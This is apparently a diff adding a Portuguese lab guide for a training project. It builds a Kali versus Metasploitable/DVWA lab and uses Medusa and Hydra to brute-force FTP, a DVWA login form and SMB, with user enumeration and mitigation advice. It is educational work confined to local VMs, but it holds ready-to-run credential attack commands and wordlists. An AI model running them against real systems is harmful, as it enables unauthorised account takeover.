@@ -1,0 +1,267 @@
+1 — Resumo do projeto
+
+Construir um laboratório com Kali Linux (atacante) e Metasploitable 2 / DVWA (alvo), usar Medusa para simular ataques de força bruta em FTP, formulário web (DVWA) e SMB, documentar resultados e propor mitigação.
+
+Aviso legal: execute estes testes apenas em ambientes que você controla e com autorização (VMs locais). Não use técnicas descritas fora de ambiente de teste.
+
+2 — Topologia e preparação do ambiente
+
+VMs no VirtualBox
+
+VM A: Kali Linux (atacante).
+
+VM B: Metasploitable 2 (alvo) — inclui serviços FTP, SMB, etc.
+
+(Opcional) VM C: DVWA (pode rodar em uma VM com Linux + Apache + PHP + MySQL, ou usar Metasploitable se já tiver DVWA instalado).
+
+Rede
+
+Use Host-only (ou Internal Network) para isolar o laboratório.
+
+Configure IPs estáticos para facilitar os testes (ex.: Kali 192.168.56.10, Metasploitable 192.168.56.101).
+
+Configurações iniciais (Kali)
+
+Atualize: sudo apt update && sudo apt upgrade -y
+
+Instale Medusa (se não estiver): sudo apt install medusa -y
+
+Instale ferramentas úteis: sudo apt install smbclient curl wget netcat nmap hydra -y (hydra como alternativa)
+
+Verifique conectividade
+
+ping 192.168.56.101
+
+nmap -sV -p 21,80,445 192.168.56.101 — confirma serviços FTP, HTTP, SMB.
+
+3 — Wordlists simples (exemplos)
+
+No Kali, crie uma pasta do projeto:
+
+mkdir -p ~/dio-medusa && cd ~/dio-medusa
+
+
+Wordlists simples (exemplo minimalista — para lab apenas):
+
+cat > users.txt <<EOF
+msfadmin
+admin
+user
+test
+EOF
+
+cat > passwords.txt <<EOF
+msfadmin
+password
+123456
+admin
+toor
+EOF
+
+
+(Adicione wordlists maiores conforme for confortável — use rockyou.txt somente localmente em lab.)
+
+4 — Cenário 1 — FTP (Medusa)
+
+Objetivo: testar força bruta em FTP usando Medusa.
+
+Comando base:
+
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -f
+
+
+Explicação:
+
+-h host alvo.
+
+-U users.txt lista de usuários.
+
+-P passwords.txt lista de senhas.
+
+-M ftp módulo FTP.
+
+-f para parar ao primeiro sucesso (útil para laboratório).
+
+Validação manual após sucesso: conectar via cliente FTP
+
+ftp 192.168.56.101
+# ou
+nc 192.168.56.101 21
+
+
+ou usar curl:
+
+curl ftp://<usuario>:<senha>@192.168.56.101/
+
+
+O que documentar:
+
+comando usado;
+
+saída do medusa (copiar/colar ou screenshot);
+
+credenciais encontradas (se houver);
+
+prova de acesso (log de ftp, saída do curl ou screenshot).
+
+5 — Cenário 2 — Formulário Web (DVWA)
+
+Nota: a sintaxe de ataque via formulário depende do form action, parâmetros e mensagem de falha da página. O Medusa tem módulos HTTP; se preferir, use hydra para ataques de formulário (exemplo fornecido). Vou descrever ambos: Medusa + alternativa com curl/hydra.
+
+5.1 — Encontrar parâmetros do formulário
+
+No navegador/DevTools:
+
+Veja action (URL de submit).
+
+Identifique nomes dos campos (ex.: username, password).
+
+Identifique texto de falha (ex.: "Login failed").
+
+5.2 — Exemplo com Medusa (varie conforme o formulário)
+
+A sintaxe exata do http do Medusa pode variar. Um exemplo genérico:
+
+medusa -h 192.168.56.101 -u admin -P passwords.txt -M http -m FORM:\"/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed\" -f
+
+
+-M http escolhe módulo HTTP.
+
+-m FORM:"/caminho:campo1=^USER^&campo2=^PASS^:F=texto_de_falha"
+
+Substitua /dvwa/login.php, username, password, e Login failed pelos valores reais.
+
+Se o Medusa do seu sistema não aceitar essa sintaxe, use hydra (exemplo abaixo) ou scripts curl.
+
+5.3 — Exemplo com Hydra (muito usado)
+hydra -L users.txt -P passwords.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+
+
+http-post-form — especifica formulário POST.
+
+Partes: URL:params:failure-string.
+
+5.4 — Teste com curl (para validar)
+
+Teste manualmente um par usuário/senha:
+
+curl -i -X POST -d "username=admin&password=msfadmin&Login=Login" http://192.168.56.101/dvwa/login.php
+
+
+Analise resposta HTML para ver se logou.
+
+Documentação:
+
+parâmetros do formulário (action, campos);
+
+string de falha usada;
+
+comando medusa/hydra/curl usado;
+
+prints/saída e evidências.
+
+6 — Cenário 3 — SMB / Password spraying
+
+Objetivo: enumeração de usuários + password spraying em SMB.
+
+6.1 — Enumerar usuários (opções)
+
+Use enum4linux para obter usuários:
+
+enum4linux -U 192.168.56.101
+
+
+Ou smbclient para listar shares e testar credenciais:
+
+smbclient -L //192.168.56.101 -N
+
+6.2 — Password spraying com Medusa (módulo SMB)
+
+Exemplo (sintaxe de módulo pode ser smbnt ou smb dependendo da versão):
+
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt -f
+
+
+Se smbnt não existir, verifique medusa -l para listar módulos. Caso não funcione, alternativa com hydra:
+
+hydra -L users.txt -P passwords.txt 192.168.56.101 smb -V
+
+
+Validação de acesso SMB:
+
+smbclient //192.168.56.101/share -U username%password
+# ou
+smbclient -L //192.168.56.101 -U username%password
+
+
+Observações (password spraying):
+
+Spray = tentar poucas senhas comuns contra muitos usuários para evitar lockout.
+
+Documente número de tentativas, intervalo entre tentativas (simule sleep), e resultados.
+
+
+## Ambiente
+- Kali Linux (atacante) — IP: `192.168.56.10`
+- Metasploitable 2 / DVWA (alvo) — IP: `192.168.56.101`
+- Rede: Host-only (VirtualBox)
+
+## Comandos principais utilizados
+### FTP
+```bash
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -f
+
+Formulário Web (DVWA) — exemplo
+medusa -h 192.168.56.101 -u admin -P passwords.txt -M http -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed" -f
+
+SMB
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt -f
+
+Evidências
+
+Incluí capturas de tela na pasta images/ mostrando:
+
+saída do Medusa com credenciais encontradas;
+
+login via FTP/SMB ou screenshot do painel DVWA após acesso.
+
+Recomendações de mitigação
+
+Política de senhas fortes e verificação de complexidade.
+
+Multi-factor authentication (MFA).
+
+Lockout / throttling após N falhas.
+
+Monitoramento e alertas de tentativas de autenticação.
+
+Segmentar serviços expostos e aplicar whitelist IP.
+
+Uso de bloqueio de conta adaptativo e captchas para formulários.
+
+Observações finais
+
+Testes realizados apenas em ambiente de laboratório e para fins educacionais.
+
+
+---
+
+#
+
+
+cd ~/dio-medusa
+git init
+git add .
+git commit -m "Entrega projeto DIO - Medusa lab"
+git branch -M main
+git remote add origin https://github.com/<seu-usuario>/dio-medusa.git
+git push -u origin main
+
+
+# SMB spray
+medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt -f | tee medusa_smb_output.txt
+
+# Enumeracao SMB
+enum4linux -U 192.168.56.101 | tee enum4linux_users.txt
+
+
